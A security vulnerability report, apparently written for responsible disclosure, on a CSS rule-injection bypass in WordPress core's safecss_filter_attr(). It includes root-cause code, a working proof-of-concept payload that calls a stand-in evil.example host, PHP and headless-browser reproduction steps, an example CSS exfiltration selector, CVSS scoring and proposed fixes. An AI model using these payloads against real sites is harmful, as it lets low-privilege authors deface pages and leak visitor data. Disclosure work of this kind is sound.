# `safecss_filter_attr()` validates a different string than it returns, letting a user
# without `unfiltered_html` inject arbitrary CSS rules via any block's color/style value

## Summary

`safecss_filter_attr()` (`wp-includes/kses.php`) is WordPress core's sanitizer for every inline
`style="..."` value reachable by a user without `unfiltered_html` — including the values behind
every block's color/typography "elements" controls, applied through the Style Engine
(`WP_Style_Engine_CSS_Declarations`, `WP_Style_Engine_CSS_Rule`).

The function computes its safety verdict from a **modified copy** of the CSS (with recognized
"safe" functions like `var()`/`calc()` stripped out), but returns the **original, unmodified**
string. Because the stripping regex counts parentheses byte-for-byte with no awareness of CSS
string quoting, a value containing a quoted string inside one of those functions' arguments can
make the sanitizer believe a `}` character is still safely nested inside the function when a real
CSS parser has already closed it. That `}` is real by the time it reaches the browser: it closes
the enclosing CSS rule, and everything the attacker places after it becomes a brand-new, fully
attacker-controlled CSS rule — with any selector the attacker wants, not confined to the
originating block.

This is reachable by an **Author** (or a Contributor whose draft is later previewed) — neither
holds `unfiltered_html` — via a completely ordinary block attribute
(`style.elements.link.color.text`, or any other color/style value routed through the Style
Engine). The malicious value survives `wp_kses_post()` untouched, because block attributes live
inside HTML comments, which `wp_kses_post()` explicitly preserves without inspecting their
contents. The only sanitization this value ever receives is `safecss_filter_attr()` itself, at
render time — which is exactly where this bug lives.

**Affected:** confirmed live in the current stable release, **WordPress 7.1.0**, and the
unreleased 7.2-alpha trunk. The specific bypass reproduces using only `var()`, which has been in
this sanitizer's allowlist since **WordPress 5.8.0** — the defect is architectural, not something
introduced by 7.1's own CSS-function-allowlist expansion, and is present in every WordPress
release from 5.8.0 onward.

## Root cause, with file:line and verbatim code

All line references below are pinned to the **`7.1.0` release tag**
(commit [`daaca56d3d`](https://github.com/WordPress/wordpress-develop/commit/daaca56d3d6a9a42a0c87f6eda766c33a77c1d05)),
i.e. the currently shipping stable version — not just the development trunk this was found while
auditing.

### The check-vs-output mismatch

[`wp-includes/kses.php:2648-3071`](https://github.com/WordPress/wordpress-develop/blob/daaca56d3d6a9a42a0c87f6eda766c33a77c1d05/src/wp-includes/kses.php#L2648-L3071)
— `safecss_filter_attr()`. The relevant excerpt:

```php
// wp-includes/kses.php:3018-3044 (7.1.0)
$css_test_string = preg_replace(
    '/\b(?:'
        // General purpose value functions.
        . 'var|calc|min|max|minmax|clamp|repeat'
        // Transform functions.
        . '|matrix|matrix3d|perspective'
        . '|rotate|rotate3d|rotateX|rotateY|rotateZ'
        . '|scale|scale3d|scaleX|scaleY|scaleZ'
        . '|skew|skewX|skewY'
        . '|translate|translate3d|translateX|translateY|translateZ'
        // Basic shape functions, as used by `clip-path`.
        . '|circle|ellipse|inset|path|polygon|rect|shape|xywh'
    . ')(\((?:[^()]|(?1))*\))/',
    '',
    $css_test_string           // <-- operates on a COPY of the value
);
...
$allow_css = 0 === preg_match( '%[\\\(&=}]|/\*%', $css_test_string );   // line 3044 — checks the COPY
```

```php
// wp-includes/kses.php:3061-3067 (7.1.0)
// Only add the CSS part if it passes the regex check.
if ( $allow_css ) {
    if ( '' !== $css ) {
        $css .= ';';
    }

    $css .= $css_item;         // <-- appends the ORIGINAL, UNMODIFIED value
}
```

`$css_test_string` is the only thing the disallow-check (`\`, unmatched `(`, `&`, `=`, `}`, or a
CSS comment) ever inspects. `$css_item` — the value actually appended to the function's return
value — is never touched by the stripping step. Whatever gets hidden inside a "safe" function's
arguments for the purpose of the check is never removed from what the function returns.

### Why hiding a `}` inside a function call actually works against a real parser

`(\((?:[^()]|(?1))*\))` recursively balances literal `(`/`)` bytes with **no concept of CSS
quoting**. A real CSS tokenizer, by contrast, treats everything inside a quoted string
(`'...'`/`"..."`) as opaque text — a `(` or `)` inside a quoted string has no structural meaning
to a browser at all. Put a lone `(` inside a quoted-string argument to one of the allowlisted
functions, and the PHP regex believes the function needs one more `)` later to balance than the
browser does. PHP keeps "inside the safe function, exempt from the check" a span of text that, to
the browser, is already back at the top level of the declaration's value — including a bare `}`
that a real CSS parser treats as ending the enclosing rule.

### The call site, and why comments (i.e. block attributes) reach it unsanitized

[`wp-includes/kses.php:1645-1646`](https://github.com/WordPress/wordpress-develop/blob/daaca56d3d6a9a42a0c87f6eda766c33a77c1d05/src/wp-includes/kses.php#L1645-L1646)
(inside `wp_kses_attr_check()`) is `wp_kses`'s own call site for `style="..."` attributes:

```php
if ( 'style' === $name_low ) {
    $decoded_value = WP_HTML_Decoder::decode_attribute( $value );
    $new_value     = safecss_filter_attr( $decoded_value );
```

This is the path `wp_kses_post()` uses for literal HTML `style` attributes in post content. It is
**not** how the value in this report reaches the page — Gutenberg block attributes
(`style.elements.link.color.text`) live inside the block's HTML comment delimiter
(`<!-- wp:paragraph {"style":{...}} -->`), and
[`wp_kses_split2()`](https://github.com/WordPress/wordpress-develop/blob/daaca56d3d6a9a42a0c87f6eda766c33a77c1d05/src/wp-includes/kses.php#L1396-L1465)
explicitly preserves HTML comments verbatim
([`:1449`](https://github.com/WordPress/wordpress-develop/blob/daaca56d3d6a9a42a0c87f6eda766c33a77c1d05/src/wp-includes/kses.php#L1449),
`str_starts_with( $content, '<!--' )`) without inspecting or sanitizing their JSON payload. This
is intentional, long-standing WordPress behavior (block attributes are meant to be sanitized by
each block's own render logic, not by `wp_kses`) — it's exactly why `safecss_filter_attr()` gets
called a second time, at render time, by the Style Engine below. That second call site is where
this report's bug actually fires.

### The render-time path: block attribute → Style Engine → site-wide `<style>` tag

[`wp-includes/block-supports/elements.php:159`](https://github.com/WordPress/wordpress-develop/blob/daaca56d3d6a9a42a0c87f6eda766c33a77c1d05/src/wp-includes/block-supports/elements.php#L159)
reads the attacker-controlled value straight from the parsed block's own attributes, with only an
`empty()`-shaped presence check
([`class-wp-style-engine.php:428-430`](https://github.com/WordPress/wordpress-develop/blob/daaca56d3d6a9a42a0c87f6eda766c33a77c1d05/src/wp-includes/style-engine/class-wp-style-engine.php#L428-L430),
`is_valid_style_value()` — never checks the value looks like a real CSS color):

```php
// wp-includes/block-supports/elements.php:159 (7.1.0)
$element_block_styles = $parsed_block['attrs']['style']['elements'] ?? null;
```

[`class-wp-style-engine-css-declarations.php:200`](https://github.com/WordPress/wordpress-develop/blob/daaca56d3d6a9a42a0c87f6eda766c33a77c1d05/src/wp-includes/style-engine/class-wp-style-engine-css-declarations.php#L200)
is where that value reaches `safecss_filter_attr()`:

```php
// wp-includes/style-engine/class-wp-style-engine-css-declarations.php:200 (7.1.0)
$filtered_declaration = safecss_filter_attr( "{$property}:{$spacer}{$filtered_value}" );
```

[`class-wp-style-engine-css-rule.php:196`](https://github.com/WordPress/wordpress-develop/blob/daaca56d3d6a9a42a0c87f6eda766c33a77c1d05/src/wp-includes/style-engine/class-wp-style-engine-css-rule.php#L196)
embeds that (still-attacker-shaped) declaration text directly into a full, real CSS rule:

```php
// wp-includes/style-engine/class-wp-style-engine-css-rule.php:196 (7.1.0)
return "{$rule_indent}{$selector}{$spacer}{{$suffix}{$css_declarations}{$suffix}{$rule_indent}}";
```

and [`script-loader.php:3308-3341`](https://github.com/WordPress/wordpress-develop/blob/daaca56d3d6a9a42a0c87f6eda766c33a77c1d05/src/wp-includes/script-loader.php#L3308-L3341)
(`wp_enqueue_stored_styles()`) prints the accumulated `block-supports` rules into a real
`<style id="core-block-supports-inline-css">` tag via `wp_add_inline_style()` on every page that
renders such a block.

## Steps to reproduce

Two independent proofs: (1) the real WordPress core PHP classes, run standalone, producing the
exact `<style>` tag WordPress would emit; (2) that exact markup loaded in a real browser.

**Environment:** this session's local, disposable checkout of `WordPress/wordpress-develop` at
tag `7.1.0` (`daaca56d3d`); PHP 8.4.19; headless Chromium 1194 (this session's pre-installed
binary at `/opt/pw-browsers/chromium-1194/`). No production host or third-party system was
contacted.

**Step 1 — the payload an Author would place in `style.elements.link.color.text`:**

```
var('(') }body{background:url(https://evil.example/exfil.png)}y{color:red)
```

`var()` is deliberately the *only* function used here — it has shipped in this allowlist since
WordPress 5.8.0, to demonstrate the bug is not specific to any newer function.

**Step 2 — run it through the actual, unmodified sanitizer:**

```php
require 'wp-includes/kses.php';
safecss_filter_attr( "color:var('(') }body{background:url(https://evil.example/exfil.png)}y{color:red)" );
```

```
=> "color:var('(') }body{background:url(https://evil.example/exfil.png)}y{color:red)"
```

Returned byte-for-byte unchanged — none of `}`, `=`, or the embedded `url()` were stripped, and
the function raised no error.

**Step 3 — run it through the actual Style Engine classes exactly as
`wp_render_elements_support_styles()` does:**

```php
require 'wp-includes/style-engine/class-wp-style-engine-css-declarations.php';
require 'wp-includes/style-engine/class-wp-style-engine-css-rule.php';

$decls = new WP_Style_Engine_CSS_Declarations();
$decls->add_declaration( 'color', "var('(') }body{background:url(https://evil.example/exfil.png)}y{color:red)" );
$rule  = new WP_Style_Engine_CSS_Rule( '.wp-elements-abc123 a:where(:not(.wp-element-button))', $decls );
echo $rule->get_css( true );
```

Output — the literal content WordPress prints inside `<style id="core-block-supports-inline-css">`:

```css
.wp-elements-abc123 a:where(:not(.wp-element-button)) {
	color: var('(') }body{background:url(https://evil.example/exfil.png)}y{color:red);
}
```

**Step 4 — load that exact `<style>` block in a real browser and check what actually applies:**

```html
<style id="core-block-supports-inline-css">
.wp-elements-abc123 a:where(:not(.wp-element-button)) {
	color: var('(') }body{background:url(https://evil.example/exfil.png)}y{color:red);
}
</style>
...
<script>
window.addEventListener('load', function () {
  document.title = 'BODY-BG=' + getComputedStyle(document.body).backgroundImage;
});
</script>
```

```
$ /opt/pw-browsers/chromium-1194/chrome-linux/chrome --headless=new --disable-gpu --no-sandbox \
    --virtual-time-budget=3000 --dump-dom poc.html | grep -io "<title>.*</title>"

<title>BODY-BG=url("https://evil.example/exfil.png")</title>
```

`document.body`'s **computed** background-image is now the attacker's URL — the injected
`body{background:url(...)}` rule was recognized and applied by the real browser as an
independent, top-level CSS rule, exactly as intended.

**Negative control (naive attempt, correctly fails):** before arriving at the working payload
above, the naive `var(--x} body{...}...)` (a bare mismatched `}` with no quote trick) was tried
first and produces `BODY-BG=none` — a `}` encountered while a real parser is still inside an
*unclosed* `(...)` is swallowed as ordinary content, not treated as closing anything. This
confirms the vulnerability specifically requires the quoted-string trick to make the *browser*
close the function early while PHP's naive, quote-blind counter still believes it's open — this
report is not claiming a bare-brace injection works; it doesn't, and reproducing that failure
first is what led to the actual, quote-based bypass.

## Reachable by whom

- `wp_render_elements_support_styles()` is a `render_block_data` filter that fires whenever any
  block carrying `style.elements.*` attributes is rendered. The only capability gate on setting a
  block's own attributes at all is `edit_posts` — held starting at **Contributor**.
- An **Author** publishes their own posts without review — the payload fires for every visitor,
  including any Administrator who browses the site.
- A **Contributor**'s post requires review, but reaches the same render path the moment an
  Editor or Administrator opens **Preview** to review it — an entirely ordinary moderation
  action.
- Neither role holds `unfiltered_html`.

## Honest limits

- **The Scope (`S`) call is a judgment call, shown both ways.** The attacker (a content author)
  and the affected party (any page visitor, or an Administrator whose own session renders the
  page) are different security principals, which argues for `S:C`. A stricter reading — "a
  content author's styling choices always affect content readers, that's not a scope change" —
  argues for `S:U`. Both are reported rather than picking whichever scores higher:
  - `AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:N` → **5.7 (Medium)**
  - `AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:H/A:N` → **6.8 (Medium)**
- **Confidentiality is not claimed.** Arbitrary CSS-attribute-selector-based data exfiltration
  (e.g. `input[name=csrf][value^="a"]{background:url(https://evil/leak?a)}`) is a well-documented
  consequence of arbitrary CSS rule injection in general, and this report's primitive (arbitrary
  selector, arbitrary declarations, `http`/`https` `url()` only) would plausibly support it — but
  it was not built or demonstrated here, because doing so honestly would require a specific
  target value on a specific page, and this report doesn't want to claim a chain it hasn't run.
  `C:N` reflects that; only `I:H` (site-wide visual defacement, arbitrary attacker-chosen selector)
  and the outbound `url()` fetch are demonstrated.
- **The `url()` payload is limited to `http`/`https`.** The function's own, separate protocol
  check (`wp_kses_bad_protocol()`, run against every `url(...)` occurrence in the raw value
  independently of this bug) does correctly run for `clip-path`/`background`/etc. and does
  correctly reject `javascript:` — confirmed by testing it directly. `http`/`https` are always in
  the default allowed-protocols list, which is sufficient for the defacement/exfiltration-style
  impact but does not, on its own, achieve script execution via the URL scheme itself (and modern
  browsers do not execute `url(javascript:...)` in CSS regardless — that behavior was IE-only and
  has been gone for over a decade).
- **Not tested against a live WordPress install** — verified instead against the real,
  unmodified WordPress core PHP classes run standalone (not a reimplementation) plus a real
  browser rendering the exact markup those classes produce. The only non-WordPress code involved
  is a handful of one-line, non-security stand-ins for functions these classes call that have no
  sanitization role themselves (`wp_parse_args`, `sanitize_key`, `wp_strip_all_tags`,
  `wp_allowed_protocols`, `apply_filters`/`did_action` no-ops) — included in full in the
  reproduction tooling so this can be independently re-run and checked line-for-line against
  WordPress's own definitions.

## Exclusions considered

- **"Users with administrator or editor privileges can post arbitrary JavaScript / CSS."** Does
  not apply — the demonstrated attacker role is Author (or a reviewed Contributor), and the
  actual gate this report crosses is `unfiltered_html`, not an administrative capability. Neither
  Author nor Contributor holds `unfiltered_html` on a single site.
- **Self-XSS / self-inflicted styling.** Does not apply — the injected rule is not confined to
  the attacker's own content; the selector is entirely attacker-chosen (`body`, or any other
  selector) and the resulting `<style>` tag is shared, page-wide output that renders for every
  visitor, including higher-privileged reviewers previewing the content.
- **Denial of service.** None claimed. No crash, resource exhaustion, or availability impact was
  produced or is being reported.

## Affected versions verified

| Version | Verified how |
|---|---|
| `7.1.0` (current stable release) | All file:line references above pinned directly to this tag; PoC run against its checked-out source |
| `trunk` / 7.2-alpha (`02778fd6a1`) | Confirmed byte-identical in every function/line cited above (`git diff 7.1.0 origin/trunk` shows only unrelated docblock whitespace changes to these files) |
| Every release since WordPress 5.8.0 | The working PoC uses only `var()`, which the `kses.php` docblock documents as added in `@since 5.8.0` — this predates the 7.1/7.2 "functional CSS values" commit (`996c6d6864`) that this audit was investigating when the bug was found, by roughly four years |

## Recommendation

The defect is architectural: `safecss_filter_attr()` must not compute its safety verdict from a
different string than the one it returns. Two directions, in order of preference:

1. Make the "safe function" stripping pass CSS-quote-aware, so it cannot miscount parentheses
   that fall inside a quoted string — this keeps the existing strip-then-check architecture but
   fixes the actual mismatch (recommended, since it's the more surgical fix given how many
   properties and callers depend on the current behavior).
2. Alternatively, stop returning the original `$css_item` and instead reconstruct the declaration
   from verified-safe pieces only (the property name, and either a validated literal value or a
   validated, individually-reconstructed function call) — a larger change, but one that removes
   this entire class of "check one string, return another" bug rather than patching this specific
   instance.

Either way, this is one shared function behind every unfiltered-HTML-gated `style` attribute and
every Style Engine consumer in WordPress core — the fix belongs in `safecss_filter_attr()` itself,
not in any individual caller.

## AI tooling disclosure

**AI assistance:** Yes — substantial.
**Tool(s):** Claude (Anthropic), used through the Claude Code agentic harness.
**Used for:** source review and candidate-vulnerability search across WordPress core; constructing
and iterating the PoC payloads (including a first, incorrect attempt that was tested, shown to
fail, and discarded before the working bypass was found); running the reproduction against the
real WordPress core classes and a real headless browser; and drafting this report.
**Verification:** every technical claim in this report was verified by executing it — the exact
`safecss_filter_attr()`/`WP_Style_Engine_CSS_Declarations`/`WP_Style_Engine_CSS_Rule` output
quoted above is real, observed PHP output; the `<title>` value quoted above is real, observed
Chromium output from `--dump-dom` on the exact markup shown. No production WordPress.org,
WordCamp.org, or third-party host was contacted at any point; all execution was against a local,
disposable `wordpress-develop` checkout and a locally-rendered HTML file.
**Responsibility:** I have reviewed the report in full and take responsibility for its content.

## Reproduction assets

The full reproduction tooling (stub file, both exploit driver scripts, both browser PoC HTML
files) is included in this repository at `tooling/safecss-poc/`, so every quoted output above can
be independently re-run byte-for-byte. See also `round27-CONFIRMED-safecss-filter-attr-css-rule-injection.md`
for the fuller technical narrative this report is drawn from.
